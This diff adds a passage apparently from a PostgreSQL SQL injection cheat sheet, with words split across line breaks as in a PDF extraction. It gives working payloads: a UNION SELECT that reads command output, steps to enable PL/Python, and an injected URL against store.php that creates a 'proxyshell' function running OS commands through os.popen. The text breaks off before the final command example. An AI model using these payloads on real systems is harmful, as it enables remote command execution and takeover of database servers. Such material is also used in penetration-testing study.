@@ -1,0 +1,26 @@
+ut) FROM ‘/tmp/
+test’ --
+/store.php?id=1 UNION ALL SELECT NULL,(SELECT sys-
+tem_out FROM stdout ORDER BY id DESC),NULL LIMIT 1
+OFFSET 1--
+plpython
+PL/Python allows users to code PostgreSQL functions in python.
+It's untrusted so there is no way to restrict what user can do. It’s
+not installed by default and can be enabled on a given database
+by CREATELANG
+[1] Check if PL/Python has been enabled on a database:
+« SELECT count(*) FROM pg_language WHERE lanname='plpy-
+thonu’
+[2] If not, try to enable:
+» CREATE LANGUAGE plpythonu
+[3] If either of the above succeeded, create a proxy shell function:
+» CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import
+os; return os.popen(args[0]).read() ‘LANGUAGE plpythonu
+[4] Have fun with:
+» SELECT proxyshell(os command);
+Example:
+[1] Create a proxy shell function:
+» /store.php?id=1; CREATE FUNCTION proxyshell(text) RE-
+TURNS text AS ‘import os; return os.popen(args[0]).read()’
+LANGUAGE plpythonu;--
+[2] Run an OS Command:
